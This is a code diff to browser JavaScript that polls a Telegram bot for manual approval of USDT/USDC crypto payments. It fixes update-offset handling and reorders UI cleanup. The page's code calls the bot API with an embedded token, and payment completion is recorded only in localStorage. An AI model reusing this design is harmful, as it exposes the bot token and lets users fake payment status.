@@ -871,16 +871,24 @@ async function acknowledgeTelegramAction(callbackId, messageId, originalText, st
     }
 }
 
+// Variable to keep track of the latest processed Telegram update ID
+let telegramLastUpdateId = 0;
+
 function startTelegramPolling(targetUser, txHash) {
     if (telegramPollInterval) clearInterval(telegramPollInterval);
 
     telegramPollInterval = setInterval(async () => {
         try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-10`);
+            // Use offset to acknowledge and clear previous updates from Telegram's queue
+            const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
             const data = await response.json();
-            if (!data.ok || !data.result) return;
+            if (!data.ok || !data.result || data.result.length === 0) return;
 
             for (const update of data.result) {
+                // Update tracker to guarantee Telegram drops this update on next query
+                telegramLastUpdateId = update.update_id;
+
                 if (update.callback_query && update.callback_query.data) {
                     const callbackData = update.callback_query.data;
                     const callbackId = update.callback_query.id;
@@ -891,7 +899,7 @@ function startTelegramPolling(targetUser, txHash) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
 
-                        // 1. SET PERMANENT COMPLETION KEYS (Triggers external auto-redirect check)
+                        // 1. SET PERMANENT COMPLETION KEYS
                         localStorage.setItem("step_3_paid", "true");
                         localStorage.setItem("step_3_txn_id", txHash);
 
@@ -910,26 +918,28 @@ function startTelegramPolling(targetUser, txHash) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ REJECTED");
 
-                        // Wipe temporary in-progress flag so reloads restore normal state
+                        // 1. Wipe in-progress state
                         localStorage.removeItem("av_payment_in_progress");
 
-                        triggerNotification("Transaction verification declined", 4000);
-                        
-                        // Clean up UI state
+                        // 2. Tear down animation element completely
                         const statusContainers = document.querySelectorAll("#active-status-container");
                         statusContainers.forEach(container => container.remove());
 
+                        // 3. Restore hidden progress/timer UIs
                         const usdtProgress = document.getElementById("usdt-progress");
                         const usdcProgress = document.getElementById("usdc-progress");
                         const usdtTimer = document.getElementById("usdt-timer");
                         const usdcTimer = document.getElementById("usdc-timer");
 
-                        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "block";
-                        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "block";
-                        if (usdtTimer) usdtTimer.style.display = "block";
-                        if (usdcTimer) usdcTimer.style.display = "block";
+                        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
+                        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
+                        if (usdtTimer) usdtTimer.style.display = "";
+                        if (usdcTimer) usdcTimer.style.display = "";
 
+                        // 4. Reset execution flag so user can click pay/copy again
                         paymentDone = false;
+
+                        triggerNotification("Transaction verification declined", 4000);
                         break;
                     }
                 }
@@ -939,6 +949,7 @@ function startTelegramPolling(targetUser, txHash) {
         }
     }, 2500);
 }
+
 
 // ==========================================
 // 6. PAYMENT HANDLERS
